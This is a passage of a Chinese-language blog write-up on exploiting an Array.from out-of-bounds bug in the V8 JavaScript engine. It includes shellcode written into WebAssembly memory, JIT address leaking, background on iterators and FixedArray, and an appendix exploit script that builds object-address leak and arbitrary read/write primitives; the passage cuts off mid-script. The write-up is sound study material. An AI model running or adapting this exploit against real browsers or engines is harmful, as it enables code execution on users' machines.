class="number">0x74</span>,<span class="number">0x6f</span>,<span class="number">0x72</span>,<span class="number">0x00</span>,<span class="number">0x56</span>,<span class="number">0x57</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xe6</span>,<span class="number">0x0f</span>,<span class="number">0x05</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;sc.length;i++)&#123;</span><br><span class="line">	wr.write(instanceAddr+i,sc[i]);</span><br><span class="line">&#125;</span><br><span class="line">f();</span><br></pre></td></tr></table></figure>
<h4 id="JIT"><a href="#JIT" class="headerlink" title="JIT"></a>JIT</h4><p>在较早期版本的v8引擎中，经常使用向JIT写入shellcode的方式。不过在6.7版本之后，JIT的区域会被标记为不可写。可以考虑JIT Spray&#x2F;JIT ROP之类的绕过。这里我们就实验如何找到JIT的这块内存为止。</p>
<p>与写入WASM一样要通过数据的结构来寻找JIT的内存，索引关系如下</p>
<p><em><strong>JSFunction-&gt;kCodeEntry Offset</strong></em></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//让function变hot</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;<span class="number">0x1000000</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">let</span> a=<span class="string">&#x27;migraine&#x27;</span>;	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//通过jsfunction结构找到JIT的地址</span></span><br><span class="line"><span class="keyword">let</span> jsfunc_addr=wr.leak_obj(f);</span><br><span class="line"><span class="keyword">let</span> jit_addr=wr.read(jsfunc_addr+<span class="number">6</span>*<span class="number">8</span>)-<span class="number">1</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;jsfunction address = &quot;</span>+hex(jsfunc_addr));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;jit address = &quot;</span>+hex(jit_addr));</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/WLtsdH.png" alt="WLtsdH"></p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/eju1Un.png" alt="eju1Un"></p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>这个漏洞来自v8对JS函数array.from的实现，开发者没有考虑到在array.from中也可以输入数组，所以造成了一个数组越界漏洞。一般来说数组越界的漏洞都比较好利用，不过写利用的时候遇到不少坑（可能因为我太菜了。</p>
<p>但说利用，有这几点需要思考。</p>
<ul>
<li>需要考虑的是gc的回收的问题，何时回收，会对我们的内存结构有什么影响</li>
<li>为什么大量进行读取之后，原本控制的ArrayBuffer位置跑飞了，如何避免</li>
<li>除了对stack进行retn覆盖，有什么办法来触发ROP（思考一下stack povit可以吗）</li>
</ul>
<hr>
<h2 id="JS基础"><a href="#JS基础" class="headerlink" title="JS基础"></a>JS基础</h2><p><em><strong>Symbol.iterator</strong></em></p>
<p>ES6标准新增的迭代器，对象编写迭代器后可以使用for … of 这些语法来进行迭代。</p>
<p>Array数组中自带Symbol.iterator。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line"><span class="built_in">console</span>.log([...a]); <span class="comment">//1,2,3,4,5</span></span><br></pre></td></tr></table></figure>
<p>让我们编写一个迭代器</p>
<p><em>Demo</em></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj=&#123;</span><br><span class="line">	<span class="number">0</span>:<span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">	<span class="number">1</span>:<span class="string">&#x27;b&#x27;</span>,</span><br><span class="line">	<span class="number">2</span>:<span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">	length:<span class="number">3</span>,</span><br><span class="line">	[<span class="built_in">Symbol</span>.iterator]:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;			<span class="comment">//迭代器实现</span></span><br><span class="line">		</span><br><span class="line">		<span class="keyword">let</span> index=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">let</span> next=<span class="function">()=&gt;</span>&#123;									<span class="comment">//迭代器必须包含一个next函数</span></span><br><span class="line">			<span class="keyword">return</span>&#123;</span><br><span class="line">				value:<span class="built_in">this</span>[index],					<span class="comment">//输出</span></span><br><span class="line">				done:<span class="built_in">this</span>.length==++index		<span class="comment">//判断退出条件</span></span><br><span class="line">			&#125;		</span><br><span class="line">		&#125;	</span><br><span class="line">		<span class="keyword">return</span> &#123;next&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(obj.length);			<span class="comment">// 3</span></span><br><span class="line"><span class="built_in">console</span>.log([...obj]);				<span class="comment">// a,b</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> p <span class="keyword">of</span> obj)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(p);							<span class="comment">//a b</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><em><strong>call()</strong></em></p>
<p>call方法在js对象中可以用修改this对象，让我们写一个小实验。</p>
<p><em>Demo</em></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> name=<span class="string">&#x27;migraine1&#x27;</span>,age=<span class="number">18</span>;</span><br><span class="line"><span class="keyword">var</span> obj=&#123;</span><br><span class="line">	name:<span class="string">&#x27;migraine2&#x27;</span>,</span><br><span class="line">	objAge:<span class="built_in">this</span>.age,</span><br><span class="line">	myFun:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="built_in">console</span>.log(<span class="built_in">this</span>.name+<span class="string">&quot; age &quot;</span>+<span class="built_in">this</span>.age);	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> db=&#123;</span><br><span class="line">	name:<span class="string">&#x27;migraine3&#x27;</span>,</span><br><span class="line">	age:<span class="number">81</span></span><br><span class="line">&#125;</span><br><span class="line">obj.myFun();		<span class="comment">//migraine2 age undefined</span></span><br><span class="line">obj.myFun.call(db);	<span class="comment">//migraine3 age 81</span></span><br></pre></td></tr></table></figure>
<p>第一次调用obj.myFun()，this的两个值得注意。funciton内的this并不是全局this，无法调用obj外部的age，所以this.age变成了undefined。而在function外部的objAge:this.age中的this则是全局的this。</p>
<p>第二次调用obj.myFun().call(db)，this对象被修改为了db，于是输出了db的name和age，这就是call函数的作用。能够将this对象指向obj外的其他对象。</p>
<p>call也支持带参数的function，Demo如下	</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj=&#123;</span><br><span class="line">	name:<span class="string">&#x27;migraine2&#x27;</span>,</span><br><span class="line">	myFun:<span class="function"><span class="keyword">function</span>(<span class="params">age</span>)</span>&#123;									<span class="comment">//带参的function</span></span><br><span class="line">		<span class="built_in">console</span>.log(<span class="built_in">this</span>.name+<span class="string">&quot; age &quot;</span>+age);	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> db=&#123;</span><br><span class="line">	name:<span class="string">&#x27;migraine3&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">obj.myFun.call(db,<span class="string">&#x27;18&#x27;</span>);	<span class="comment">//migraine3 age 18</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>Array.from</strong></p>
<p>Array.from()方法就是将一个类数组对象或者可遍历对象转换成一个真正的数组。<br>类数组对象需要满足基本要求是具有length属性。</p>
<p><strong>Array.from(arrayLike[, mapFn[, thisArg]])</strong><br><strong>arrayLike</strong>：被转换的的对象。<br><strong>mapFn：map</strong>函数。<br><strong>thisArg：map</strong>函数中this指向的对象。 </p>
<p><em>Demo</em></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> oobArray = [];</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Array</span>.from([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>],<span class="function">(<span class="params">n</span>)=&gt;</span>n+<span class="number">1</span>));								<span class="comment">//2,3,4,5</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Array</span>.from.call(oobArray,[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>],<span class="function">(<span class="params">n</span>)=&gt;</span>n+<span class="number">1</span>));	<span class="comment">//2,3,4,5</span></span><br></pre></td></tr></table></figure>
<p>从Demo可以看出，call并不影响Array.from函数的使用，修改this为oobArray对象。</p>
<p>在poc中,将this指向oobArray对象，然后将一个包含迭代器的类数组对象转化为数组。之后oobArray迭代输出来验证这个过程。(需要删除oobArray.length &#x3D; 0;)</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Array</span>.from.call(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> oobArray &#125;, &#123;[<span class="built_in">Symbol</span>.iterator] : <span class="function"><span class="params">_</span> =&gt;</span> ()...&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(...oobArray);<span class="comment">//0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16....</span></span><br></pre></td></tr></table></figure>
<p>Array.from的Polyfill实现可以参考</p>
<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/from#Polyfill">Array.from:Polyfill</a> </p>
<h2 id="v8基础"><a href="#v8基础" class="headerlink" title="v8基础"></a>v8基础</h2><p><em><strong>关于V8对象的基础可以看我整理的<a href="https://migraine-sudo.github.io/2020/02/15/v8/">V8基础</a>，在这部分补充一些与题目相关的v8内容。</strong></em></p>
<p><em><strong>FixedArray</strong></em>是<em>v8</em>中定义一类固定长度的数组类*(src&#x2F;object&#x2F;fixed-array.h)*也是在Object中最常见的一类数组，包括Elements和Property的数据都是存放在FixedArray中。</p>
<p><em>类之间的父子关系如下，箭头指向继承的结构，可以结合源代码消化</em></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//继承关系</span></span><br><span class="line">HeapObject--&gt;FixedArrayBase--&gt;FixedArray</span><br><span class="line">  |								|</span><br><span class="line">  v								v</span><br><span class="line">  <span class="built_in">map</span>						length</span><br><span class="line"></span><br><span class="line">  <span class="comment">//数据结构</span></span><br><span class="line">  FixedArray </span><br><span class="line">  |__ map__|</span><br><span class="line">  |_length_|</span><br><span class="line">  | values |</span><br><span class="line">  |		...  |</span><br></pre></td></tr></table></figure>


<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/set-promise/p/10810734.html">ES6-Symbol.iterator 迭代器</a><br><a target="_blank" rel="noopener" href="https://www.runoob.com/w3cnote/js-call-apply-bind.html">JavaScript 中 call()、apply()、bind() 的用法</a></p>
<p><a target="_blank" rel="noopener" href="http://rk700.github.io/2015/04/09/dt_debug-read/">通过DT_DEBUG来获得各个库的基址</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/203721.html">从一道CTF题零基础学V8漏洞利用</a><br><a target="_blank" rel="noopener" href="https://www.sunxiaokong.xyz/2020-01-16/lzx-roll-a-d8/">821137-V8引擎数组越界漏洞分析及利用</a></p>
<h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><h3 id="使用libc泄露的exploit"><a href="#使用libc泄露的exploit" class="headerlink" title="使用libc泄露的exploit"></a>使用libc泄露的exploit</h3><p>适用情况：只能在Ubuntu16.04（glibc2.23）下成功exploit，其他版本需要调整</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ChangeType</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="built_in">this</span>.buf=<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line">		<span class="built_in">this</span>.f64=<span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="built_in">this</span>.buf);</span><br><span class="line">		<span class="built_in">this</span>.u32=<span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="built_in">this</span>.buf);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="title">f2i</span>(<span class="params">val</span>)</span>&#123;</span><br><span class="line">		<span class="built_in">this</span>.f64[<span class="number">0</span>]=val;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">this</span>.u32[<span class="number">1</span>]*<span class="number">0x100000000</span>+<span class="built_in">this</span>.u32[<span class="number">0</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="title">i2f</span>(<span class="params">val</span>)</span>&#123;</span><br><span class="line">		<span class="built_in">this</span>.u32[<span class="number">0</span>]=<span class="built_in">parseInt</span>(val%<span class="number">0x100000000</span>);</span><br><span class="line">		<span class="built_in">this</span>.u32[<span class="number">1</span>]=<span class="built_in">parseInt</span>((val-<span class="built_in">this</span>.u32[<span class="number">0</span>])/<span class="number">0x100000000</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">this</span>.f64[<span class="number">0</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + (x.toString(<span class="number">16</span>)).padStart(<span class="number">16</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> ct=<span class="keyword">new</span> ChangeType(); </span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> oobArray = [<span class="number">1.1</span>];  <span class="comment">//float</span></span><br><span class="line"><span class="keyword">let</span> arrays=[];	</span><br><span class="line"><span class="keyword">let</span> objs=[];		<span class="comment">//for leak							</span></span><br><span class="line"><span class="keyword">let</span> maxSize = <span class="number">1028</span> * <span class="number">8</span>;			<span class="comment">//8224	</span></span><br><span class="line">	</span><br><span class="line"><span class="built_in">Array</span>.from.call(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> oobArray &#125;, &#123;[<span class="built_in">Symbol</span>.iterator] : <span class="function"><span class="params">_</span> =&gt;</span> ( </span><br><span class="line">  &#123;</span><br><span class="line">    counter : <span class="number">0</span>,</span><br><span class="line">    <span class="function"><span class="title">next</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">      <span class="keyword">let</span> result = <span class="number">1.1</span>;</span><br><span class="line">	<span class="built_in">this</span>.counter++;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">this</span>.counter &gt; maxSize) &#123;	 	</span><br><span class="line">	 oobArray.length=<span class="number">1</span>;	<span class="comment">// !=0 void from be huishou by GC,Elements will point to a null pointer</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">	    <span class="keyword">let</span> array=<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x512</span>);</span><br><span class="line">	    <span class="keyword">let</span> obj=&#123;<span class="string">&#x27;a&#x27;</span>:<span class="number">0x1234</span>,<span class="string">&#x27;b&#x27;</span>:<span class="number">0x5678</span>&#125;;</span><br><span class="line">	    arrays.push(array);</span><br><span class="line">	    objs.push(obj);</span><br><span class="line">	    <span class="comment">//%DebugPrint(array);	</span></span><br><span class="line">	&#125;		</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="attr">done</span>: <span class="literal">true</span>&#125;;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="attr">value</span>: result, <span class="attr">done</span>: <span class="literal">false</span>&#125;;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">) &#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> backing_store;</span><br><span class="line"><span class="keyword">let</span> kbitfield;</span><br><span class="line"><span class="keyword">let</span> buf_index;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;=maxSize;i++)&#123;<span class="keyword">let</span> x=oobArray[i]&#125;; <span class="comment">//GC</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//find ArrayBuffer in the shot</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;maxSize;i++)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">let</span> val=ct.f2i(oobArray[i]);</span><br><span class="line">	<span class="keyword">if</span>(val===<span class="number">0x51200000000</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		backing_store=i+<span class="number">1</span>;</span><br><span class="line">		kbitfield=backing_store+<span class="number">1</span>;</span><br><span class="line">		<span class="built_in">console</span>.log(<span class="string">&quot;[*]find target ArrayBuffer in oobArray number [&quot;</span>+i+<span class="string">&quot;]&quot;</span>);</span><br><span class="line">		oobArray[i]=ct.i2f(<span class="number">0xbeaf00000000</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)</span><br><span class="line">&#123;	</span><br><span class="line">	<span class="comment">//console.log(arrays[i].bytelength);</span></span><br><span class="line">	<span class="keyword">if</span>(arrays[i].byteLength===<span class="number">0xbeaf</span>)&#123;</span><br><span class="line">		</span><br><span class="line">	   	<span class="built_in">console</span>.log(<span class="string">&quot;[*]find target ArrayBuffer number [&quot;</span>+i+<span class="string">&quot;]&quot;</span>);</span><br><span class="line">		buf_index=i;	</span><br><span class="line">		<span class="keyword">let</span> tmp=<span class="keyword">new</span> <span class="built_in">Float64Array</span>(arrays[buf_index],<span class="number">0</span>,<span class="number">0x10</span>);</span><br><span class="line">		tmp[<span class="number">0</span>]=ct.i2f(<span class="number">0xdeadbeef</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj_index;</span><br><span class="line"><span class="keyword">let</span> obj_offset;</span><br><span class="line"><span class="comment">//find Objects</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;maxSize;i++)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">let</span> val=ct.f2i(oobArray[i]);</span><br><span class="line">	<span class="keyword">if</span>(val===<span class="number">0x123400000000</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		obj_offset=i;</span><br><span class="line">		<span class="built_in">console</span>.log(<span class="string">&quot;[*]find target objecets in oobArray number [&quot;</span>+i+<span class="string">&quot;]&quot;</span>);</span><br><span class="line">		oobArray[i]=ct.i2f(<span class="number">0x123500000000</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)</span><br><span class="line">&#123;	</span><br><span class="line">	<span class="keyword">if</span>(objs[i].a===<span class="number">0x1235</span>)&#123;</span><br><span class="line">	   	<span class="built_in">console</span>.log(<span class="string">&quot;[*]find target objs number [&quot;</span>+i+<span class="string">&quot;]&quot;</span>);</span><br><span class="line">		obj_index=i;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ArbitraryRW</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="function"><span class="title">leak_obj</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">		objs[obj_index].a = obj;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">return</span> ct.f2i(oobArray[obj_offset]) - <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="title">read</span>(<span class="params">addr</span>)</span>&#123;</span><br><span class="line">		oobArray[backing_store]=ct.i2f(addr);</span><br><span class="line">		oobArray[kbitfield]=ct.i2f(addr);</span><br><span class="line">		<span class="comment">//console.log(hex(addr));</span></span><br><span class="line">		<span class="comment">//console.log(hex(ct.f2i(oobArray[backing_store])));</span></span><br><span class="line">		<span class="comment">//console.log(hex(ct.f2i(oobArray[kbitfield])));</span></span><br><span class="line">		<span class="keyword">let</span> tmp=<span class="keyword">new</span> <span class="built_in">Float64Array</span>(arrays[buf_index],<span class="number">0</span>,<span class="number">0x10</span>);</span><br><span class="line">		<span class="keyword">return</span> ct.f2i(tmp[<span class="number">0</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="title">write</span>(<span class="params">addr,value</span>)</span>&#123;</span><br><span class="line">		oobArray[backing_store]=ct.i2f(addr);</span><br><span class="line">		oobArray[kbitfield]=ct.i2f(addr);</span><br><span class="line">		<span class="built_in">this</span>.f64=<span class="keyword">new</span> <span class="built_in">Float64Array</span>(arrays[buf_index],<span class="number">0</span>,<span class="number">0x10</span>);</span><br><span class="line">		<span class="built_in">this</span>.f64[<span class="number">0</span>]=ct.i2f(value);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="title">leak</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> ct.f2i(oobArray[kbitfield]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> 